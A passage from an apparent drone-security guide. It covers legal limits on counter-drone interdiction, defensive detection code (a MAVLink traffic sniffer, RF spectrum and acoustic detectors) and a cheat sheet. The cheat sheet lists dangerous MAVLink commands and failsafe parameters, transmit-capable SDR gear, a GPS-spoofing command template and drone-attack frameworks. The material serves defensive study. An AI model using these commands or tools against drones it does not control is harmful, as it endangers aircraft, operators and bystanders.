                 drone_msg['drone_lat'], drone_msg['drone_lon'])
print(f"Drone {drone_msg['serial']}: {dist:.0f} m from facility center")
if dist < FACILITY_RADIUS_M:
    print("[!] ALERT: Drone INSIDE exclusion zone!")
    print(f"    Operator home: {drone_msg['home_lat']:.6f}, {drone_msg['home_lon']:.6f}")
EOF
```

```bash
# === CUAS Interdiction (Legal Constraints) ===
# In the USA, 18 U.S.C. § 32 makes it a FELONY to:
#   - Damage or destroy any aircraft, including drones (penalty: up to 20 years)
#   - Interfere with anyone operating an aircraft
#
# Only DHS, DOJ, and DoD have explicit CUAS authority (6 U.S.C. § 465, 2024 NDAA § 1308).
# State/local police, private facilities, and civilians have NO interdiction authority.
#
# Permitted responses for non-federal actors:
#   - PASSIVE: RF detection, DroneID logging, radar, EO/IR
#   - Documentation: collect evidence for law enforcement
#   - Verbal/written request: ask the operator to leave
#   - Notify FAA FSDO or local law enforcement
#
# Active interdiction (jamming, takeover, kinetic kill) is RESTRICTED to federal actors
# with explicit authorization. NEVER attempt active interdiction of a drone you do not own.
```

---

## 17. Detection (Blue Side) — RF Monitoring / DroneID Sensors / Radar / Acoustic

```bash
# === RF Anomaly Detection for Drone MAVLink ===

# Goal: detect unauthorized MAVLink traffic on a network segment.
# Approach: passive sniffing + anomaly heuristics.

python3 << 'EOF'
"""
MAVLink anomaly detector — runs on a network tap (e.g., an inline sniffer
between GCS and telemetry radio). Alerts on:
  - Unknown sysid/compid appearing on the network
  - Unsigned MAVLink 2 packets (no signature)
  - Unexpected SET_MODE / COMMAND_LONG with arm/takeoff
  - MAVLink FTP traffic
  - Param writes outside a whitelist
"""
from scapy.all import sniff, UDP
from pymavlink import mavutil

WHITELIST_SYSIDS = {1, 253}  # known-good sysids
ALERT_EVENTS = []

class MAVLinkAnomalyDetector:
    def __init__(self):
        self.conn = mavutil.mavlink.MAVLink(self, srcSystem=255)

    def write(self, buf):
        # Required by pymavlink for the connection; this is the output sink
        pass

    def process_packet(self, raw: bytes):
        try:
            msg = self.conn.decode(raw)
        except Exception:
            return
        if msg is None:
            return
        sysid = msg.get_srcSystem()
        compid = msg.get_srcComponent()
        msgname = msg.get_type()
        # Check 1: unknown sysid
        if sysid not in WHITELIST_SYSIDS:
            self.alert(f"UNKNOWN sysid={sysid} compid={compid} msg={msgname}")
        # Check 2: MAVLink 2 without signature
        if msg.get_msgbuf()[0] == 0xFD:  # MAVLink 2
            incompat = msg.get_msgbuf()[4] if len(msg.get_msgbuf()) > 4 else 0
            if not (incompat & 0x01):  # bit 0 = signed
                # Unsigned MAVLink 2 is the common case but worth noting
                pass
        # Check 3: dangerous commands
        if msgname == 'COMMAND_LONG':
            cmd = msg.command
            if cmd in (400, 22, 16, 21, 211):  # ARM, TAKEOFF, etc.
                self.alert(f"DANGEROUS COMMAND sysid={sysid} cmd={cmd}")
        elif msgname == 'SET_MODE':
            self.alert(f"SET_MODE sysid={sysid} mode={msg.custom_mode}")

    def alert(self, msg: str):
        ALERT_EVENTS.append(msg)
        print(f"[!] MAVLink ANOMALY: {msg}")

detector = MAVLinkAnomalyDetector()

def packet_handler(pkt):
    if UDP in pkt and pkt[UDP].sport in (14550, 14551, 5760, 5762):
        raw = bytes(pkt[UDP].payload)
        detector.process_packet(raw)

sniff(iface='eth0', filter='udp portrange 14550-14551 or tcp portrange 5760-5762',
      prn=packet_handler, store=False)
EOF
```

```bash
# === RF Spectrum Baseline + Anomaly Detection ===

# Build a spectrum baseline over a quiet period (no drones)
rtl_power -f 2400M:2500M:500k -i 1 -e 3600 baseline_2400.csv

# Compute statistics
python3 << 'EOF'
import numpy as np
import csv
with open('baseline_2400.csv') as f:
    reader = csv.reader(f)
    baseline = []
    for row in reader:
        samples = [float(x) for x in row[6:]]
        baseline.append(samples)
baseline = np.array(baseline)
mean_per_bin = np.mean(baseline, axis=0)
std_per_bin = np.std(baseline, axis=0)
# Save baseline
np.savez('baseline_2400.npz', mean=mean_per_bin, std=std_per_bin)
print(f"Baseline: {len(mean_per_bin)} frequency bins")
print(f"Mean noise floor: {np.mean(mean_per_bin):.1f} dB")
EOF

# Live anomaly detection
python3 << 'EOF'
import numpy as np
import csv
import subprocess
import time
baseline = np.load('baseline_2400.npz')
mean = baseline['mean']
std = baseline['std']
THRESHOLD_SIGMA = 5  # 5 sigma above baseline = anomaly

while True:
    # Capture 10 seconds
    subprocess.run(['rtl_power', '-f', '2400M:2500M:500k', '-i', '1', '-e', '10',
                    'live_2400.csv'], check=True)
    with open('live_2400.csv') as f:
        reader = csv.reader(f)
        live = []
        for row in reader:
            live.append([float(x) for x in row[6:]])
    live = np.array(live)
    live_mean = np.mean(live, axis=0)
    # Find bins where live > baseline + N*std
    anomaly_mask = live_mean > (mean + THRESHOLD_SIGMA * std)
    if anomaly_mask.any():
        n_anomalies = anomaly_mask.sum()
        # Find the strongest anomaly
        max_idx = np.argmax(live_mean - mean)
        max_bin_freq_mhz = 2400 + max_idx * 0.5
        print(f"[!] ANOMALY at {max_bin_freq_mhz:.1f} MHz "
              f"(live={live_mean[max_idx]:.1f} dB, baseline={mean[max_idx]:.1f} dB)")
    else:
        print(f"OK: spectrum within baseline")
    time.sleep(1)
EOF
```

```bash
# === Acoustic Detection ===

# Drones have distinctive rotor signatures (typically 100-300 Hz fundamental
# + harmonics, depending on prop RPM and blade count).

# Capture audio with a USB microphone or array
arecord -d 10 -r 48000 -c 1 -f S16_LE drone_audio.wav

# Analyze spectrogram
sox drone_audio.wav -n spectrogram -o drone_audio.png

# Or in python:
python3 << 'EOF'
import numpy as np
import wave
import matplotlib.pyplot as plt

with wave.open('drone_audio.wav') as w:
    fs = w.getframerate()
    n = w.getnframes()
    audio = np.frombuffer(w.readframes(n), dtype=np.int16).astype(np.float32) / 32768

# FFT
window = audio[:fs]  # 1 second
fft = np.fft.rfft(window)
power = np.abs(fft) ** 2
freqs = np.fft.rfftfreq(fs, 1/fs)

# Look for peaks in 50-500 Hz range (rotor harmonics)
mask = (freqs > 50) & (freqs < 500)
peak_idx = np.argmax(power[mask])
peak_freq = freqs[mask][peak_idx]
print(f"Peak rotor frequency: {peak_freq:.1f} Hz")

# Drone ID heuristics:
#   ~80-150 Hz fundamental → small quad (DJI Mavic, Phantom)
#   ~150-250 Hz → mid-size quad
#   ~250-400 Hz → small racing drone
#   Harmonics present → multi-rotor (vs single-rotor helicopter)
EOF
```

---

## 18. Quick Reference Cheat Sheet

```
============================= UAV / DRONE SECURITY QUICK REFERENCE =============================

KEY FREQUENCIES:
  2.4 GHz ISM       Control link (FrSky, FlySky, ELRS, CRSF, DJI OcuSync)
  5.8 GHz ISM       Video link (analog FPV, DJI O3, Walksnail, HDZero)
  900 MHz (USA/AU)  MAVLink telemetry radio (3DR Radio, RFD900)
  433 MHz (EU)      MAVLink telemetry radio
  1575.42 MHz       GPS L1 C/A (receive-only on drone)
  1227.60 MHz       GPS L2C
  1561.098 MHz      BeiDou B1I

MAVLINK PORTS:
  UDP 14550         GCS link (default)
  UDP 14551         Secondary GCS
  UDP 14540         Offboard (companion computer)
  UDP 14560         SDK (dronekit, MAVSDK)
  TCP 5760          SITL primary
  TCP 5762          SITL secondary

MAVLINK MAGIC BYTES:
  0xFE              MAVLink 1 packet start
  0xFD              MAVLink 2 packet start

MAVLINK DANGEROUS COMMANDS:
  MAV_CMD_COMPONENT_ARM_DISARM (400)       param1=1 → ARM
  MAV_CMD_NAV_TAKEOFF (22)                 param7 → takeoff altitude
  MAV_CMD_NAV_RETURN_TO_LAUNCH (20)
  MAV_CMD_DO_SET_MODE (176)
  MAV_CMD_PREFLIGHT_REBOOT_SHUTDOWN (246)  param1=1 → SHUTDOWN

PX4 DANGEROUS PARAMS:
  COM_RC_OVERRIDE, NAV_RCL_ACT, NAV_DLL_ACT, COM_OBS_AVOID_TILT,
  RTL_RETURN_ALT, MAV_FWDEXTSP, COM_ARM_CHK_ESCS

ARDUPILOT DANGEROUS PARAMS:
  ARMING_CHECK, FLTMODE1..6, FS_GCS_ENABLE, FS_GPS_ENABLE, FS_BATT_ENABLE,
  RTL_ALT, EK3_GPS_CHECK, SYSID_MAVLINK

SDR HARDWARE:
  RTL-SDR v3        RX-only, 24-1766 MHz, $30
  HackRF One        TX+RX, 1-6000 MHz, $330 (required for 5.8 GHz)
  BladeRF 2.0       TX+RX, 47-6000 MHz, $480
  Crazyradio PA    nRF24 2.4 GHz, $35

KEY TOOLS:
  mavproxy.py --master=tcp:HOST:PORT --console --map
  tshark -i any -f "udp port 14550" -Y mavlink
  hackrf_transfer -r FILE.raw -f FREQ_HZ -s RATE -l LNA -g VGA -n SAMPLES
  hackrf_sweep -f START:END -w WIDTH
  urh CAPTURE.complex
  gpssim -e BRDC.24n -l LAT,LON,ALT -b 8 -d DURATION -o OUT.bin
  dronesploit (framework)

FLIGHT LOG FORMATS:
  .ulg     PX4 ULog binary
  .bin     ArduPilot DataFlash binary
  .log     ArduPilot text log
  .DAT     DJI binary
  .tlog    MAVLink telemetry log (xml-ish text)

FIRMWARE FORMATS:
  .px4     PX4 (JSON wrapper around ELF)
  .apj     ArduPilot (text wrapper around binary)
  .hex     ArduPilot Intel HEX
  dji_system.bin   DJI encrypted

LEGAL QUICK REFERENCE:
  FAA Part 107          US commercial drone ops (Remote Pilot Cert, LAANC)
  FCC Part 15           RF emissions limits (ISM bands only)
  18 U.S.C. § 32        FELONY to damage/interfere with any aircraft
  6 U.S.C. § 465        DHS/DOJ CUAS authority (federal only)
  FAA Remote ID rule    ASTM F3411 broadcast mandated for all drones > 250g

INCIDENTS TO REMEMBER:
  2011 RQ-170 Iran      GPS spoof brought down US military drone
  2017 US Army DJI ban  Cited data-leakage concerns
  2020 Apache Vegas     Civilian drone interfered with police helicopter
  2023-24 CISA PX4 advisory   PX4/Pixhawk autopilot flaws
  2024 FAA Remote ID    ASTM F3411 mandate for all drones > 250g

RESEARCH HUBS:
  Awesome-Drone-Hacking  github.com/nicholasaleks/Awesome-Drone-Hacking
  PX4-Autopilot           github.com/PX4/PX4-Autopilot
  ArduPilot               github.com/ArduPilot/ardupilot
  DroneSploit             github.com/dronesploit/dronesploit
  DroneID-timeline        github.com/trendmicro/DroneID-timeline
  GPS-SDR-SIM             github.com/osqzssp/GPS-SDR-SIM
  DEF CON Aerial Assault Village   yearly training track

============================= END QUICK REFERENCE =============================
```
